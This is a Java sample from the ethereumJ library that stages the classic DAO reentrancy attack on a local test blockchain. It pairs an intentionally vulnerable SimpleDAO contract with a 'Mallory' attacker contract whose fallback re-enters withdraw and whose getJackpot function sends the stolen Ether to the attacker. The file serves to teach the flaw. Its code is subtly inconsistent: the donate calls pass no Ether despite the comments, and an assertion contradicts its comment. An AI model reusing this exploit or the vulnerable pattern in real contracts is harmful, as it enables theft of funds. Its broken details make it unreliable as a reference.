/*
 * Copyright (c) [2016] [ <ether.camp> ]
 * This file is part of the ethereumJ library.
 *
 * The ethereumJ library is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * The ethereumJ library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with the ethereumJ library. If not, see <http://www.gnu.org/licenses/>.
 */
package org.ethereum.samples;

import org.ethereum.core.BlockSummary;
import org.ethereum.core.Transaction;
import org.ethereum.crypto.ECKey;
import org.ethereum.crypto.HashUtil;
import org.ethereum.listener.EthereumListenerAdapter;
import org.ethereum.util.ByteUtil;
import org.ethereum.util.blockchain.SolidityCallResult;
import org.ethereum.util.blockchain.SolidityContract;
import org.ethereum.util.blockchain.StandaloneBlockchain;

import java.math.BigInteger;

/**
 * The class demonstrates usage of the StandaloneBlockchain helper class
 * which greatly simplifies Solidity contract testing on a locally created
 * blockchain
 *
 * Created by Anton Nashatyrev on 04.04.2016.
 */
public class SimpleDaoSample {
//    private static final String simpleStorageContractSrc =
//            "contract SimpleStorage {" +
//            "    uint public storedData;" +
//            "" +
//            "    function set(uint x) public {" +
//            "        storedData = x;" +
//            "    }" +
//            "" +
//            "    function get() public view returns (uint) {" +
//            "        return storedData;" +
//            "    }" +
//            "}";

    private static final String daoContractSrc =
            "contract SimpleDAO {" +
            "     mapping (address => uint) public credit;" +
            "     function donate(address to) payable {" +
            "        credit[to] += msg.value;" +
            "    }" +
            "     function queryCredit(address to) constant returns (uint) {" +
            "         return credit[to];" +
            "    }" +
            "     function withdraw(uint amount) {" +
            "         if (credit[msg.sender] >= amount) {" +
            "             msg.sender.call.value(amount)();" +
            "             credit[msg.sender] -= amount;" +
            "         }" +
            "    }" +
            "}";

    private static final String malloryContractSrc =
            "contract Mallory {" +
            "    event LogCall(uint x);" +
            "    SimpleDAO public dao;" +
            "    address owner;" +
            "    constructor(SimpleDAO _dao) public {" +
            "        dao = _dao;" +
            "        owner = msg.sender; " +
            "    }" +
            "    function() payable { " +
            "        LogCall(this.balance);" +
            "        dao.withdraw(dao.queryCredit(this)); " +
            "    }" +
            "    function getJackpot() { " +
            "        owner.send(this.balance); " +
            "    }" +
            "}";

    private static final String contractSrc =
            "pragma solidity ^0.4.25;" +
                daoContractSrc +
                malloryContractSrc;

    StandaloneBlockchain bc;

    public static void main(String[] args) throws Exception {
        SimpleDaoSample main = new SimpleDaoSample();
        main.simpleDaoContract(args);
    }

    public void simpleDaoContract(String[] args) throws Exception {
        // Creating a blockchain which generates a new block for each transaction
        // just not to call createBlock() after each call transaction
        bc = new StandaloneBlockchain().withAutoblock(true);
        System.out.println("Creating first empty block (need some time to generate DAG)...");
        // warning up the block miner just to understand how long
        // the initial miner dataset is generated
        bc.createBlock();

        bc.addEthereumListener(new EthereumListenerAdapter() {
            @Override
            public void onBlock(BlockSummary blockSummary, boolean best) {
                blockSummary.getReceipts().forEach(receipt -> receipt.getLogInfoList().
                        forEach(logInfo -> {
                            System.out.println("LogInfo: " + logInfo);
                        }));
            }
        });

        System.out.println("Creating accounts: ownder, user1, user2, user3");

        //@@ account{balance:10ether} owner;
        Account owner = new Account("account owner");
        bc.sendEther(owner.getEckey().getAddress(), new BigInteger("500000000000000000"));


        //@@ account{balance:50ether} user1, user2, user3;
        Account user1 = new Account("account user1");
        bc.sendEther(user1.getEckey().getAddress(), new BigInteger("500000000000000000"));

        Account user2 = new Account("account user2");
        bc.sendEther(user2.getEckey().getAddress(), new BigInteger("500000000000000000"));

        Account user3 = new Account("account user3");
        bc.sendEther(user3.getEckey().getAddress(), new BigInteger("500000000000000000"));

        Account hacker = new Account("account hacker");
        bc.sendEther(hacker.getEckey().getAddress(), new BigInteger("500000000000000000"));

        //@@ account{smart contract : dao.sol, by: owner, balance: 0eth} dao;
//        Account dao = new Account("account dao");
//        bc.sendEther(dao.getEckey().getAddress(), new BigInteger("500000000000000000"));

        System.out.println("Creating a contract: SimpleDAO");
        // This compiles our Solidity contract, submits it to the blockchain
        // internally generates the block with this transaction and returns the
        // contract interface

        //@@ account{smart contract : simple_storage.sol, by:owner, balance: 0eth} simplestorage;
        bc.setSender(owner.getEckey());
        SolidityContract  daoContract = bc.submitNewContract(contractSrc, "SimpleDAO");

        System.out.println("User1, user2, and user3 donate 1ether, 5ether, and 10ethere to the dao.");

        //@@ sendTransaction(dao, donate, user1, {from:user1, gas:3000000, value:1ether});

        bc.setSender(user1.getEckey());
        SolidityCallResult result_donate1 = daoContract.callFunction("donate", 1);
        System.out.println(result_donate1);


        //@@ sendTransaction(dao, donate, user2, {from:user2, gas:3000000, value:5ether});

        bc.setSender(user2.getEckey());
        SolidityCallResult result_donate2 = daoContract.callFunction("donate", 5);
        System.out.println(result_donate2);

        //@@ sendTransaction(dao, donate, user3, {account:user2, gaslimit:3000000, value:10ether});

        bc.setSender(user3.getEckey());
        SolidityCallResult result_donate3 = daoContract.callFunction("donate", 10);
        System.out.println(result_donate3);

        BigInteger user1_bi = bc.getBlockchain().getRepository().getBalance(user1.getEckey().getAddress());
        BigInteger user2_bi = bc.getBlockchain().getRepository().getBalance(user2.getEckey().getAddress());
        BigInteger user3_bi = bc.getBlockchain().getRepository().getBalance(user3.getEckey().getAddress());

        System.out.println("user1 balance: " + user1_bi);
        System.out.println("user2 balance: " + user2_bi);
        System.out.println("user3 balance: " + user3_bi);

        System.out.println("Creating accounts: hacker");

        //@@ account{balance: 1ether} hacker;
//        Account hacker = new Account("account hacker");
//        bc.sendEther(hacker.getEckey().getAddress(), new BigInteger("250000000000000000"));

        System.out.println("The hacker donates 1ether to the dao.");

        bc.setSender(hacker.getEckey());
        SolidityCallResult result_donate_hacker = daoContract.callFunction("donate", 1);
        System.out.println(result_donate_hacker);

        BigInteger hacker_bi = bc.getBlockchain().getRepository().getBalance(hacker.getEckey().getAddress());
        System.out.println("hacker balance: " + hacker_bi);

        System.out.println("Creating a contract: Mallory");

        //@@ account{smart contract : mallory.sol, by: hacker, balance: 0eth} malory(dao);
        bc.setSender(hacker.getEckey());
        SolidityContract malloryContract =
                bc.submitNewContract(contractSrc, "Mallory",
                        new Object[] { ByteUtil.bytesToBigInteger(daoContract.getAddress()) });

        //@@ sendTransaction(dao, donate, mallory, {from:hacker, gas:3000000, value:1ether});

        System.out.println("The hacker calls the fallback function of the mallory contract.");

        //@@ sendTransaction(mallory, fallback, {from:hacker, gas:300000000, value:0ether});
        bc.setSender(hacker.getEckey());
        SolidityCallResult result_fallback = malloryContract.callFunction("");
        System.out.println(result_fallback);

        System.out.println("The fallback function of the mallory contract does the job.");

//        while(true) {
//            BigInteger bi = bc.getBlockchain().getRepository().getBalance(malloryContract.getAddress());
//            long delta = 5; // 12 = 17 -delta = 12 - 5
//            if (bi.compareTo(new BigInteger("12")) == 1) {
//                break;
//            }
//            else {
////                System.out.print("==> " + bi);
//            }
//        }
        System.out.println();

        System.out.println("The hacker calls the getJackpot function of the mallory contract.");

        //@@ sendTransaction(mallory, getJackpot, {from:hacker, gas:300000, value:0ether});
        bc.setSender(hacker.getEckey());
        SolidityCallResult result_getJackpot = malloryContract.callFunction("getJackpot");
        System.out.println(result_getJackpot);

        //@@ assert hacker.balance <= 1ether;
        BigInteger bi = bc.getBlockchain().getRepository().getBalance(hacker.getEckey().getAddress());
        assert(bi.compareTo(new BigInteger("1")) == 1);

        System.out.println("The hacker has now gotten: " + bi);

        System.out.println("Done.");
    }

    private static void assertEqual(BigInteger n1, BigInteger n2) {
        if (!n1.equals(n2)) {
            throw new RuntimeException("Assertion failed: " + n1 + " != " + n2);
        }
    }

    class Account {
        private String phrase;
        private byte[] senderPrivateKey;
        private ECKey eckey;

        public Account(String phrase) {
            this.phrase = phrase;
            this.senderPrivateKey = HashUtil.sha3(this.phrase.getBytes());
            this.eckey = ECKey.fromPrivate(this.senderPrivateKey);
        }

        public ECKey getEckey() {
            return eckey;
        }

        public byte[] getSenderPrivateKey() {
            return senderPrivateKey;
        }
    }
}



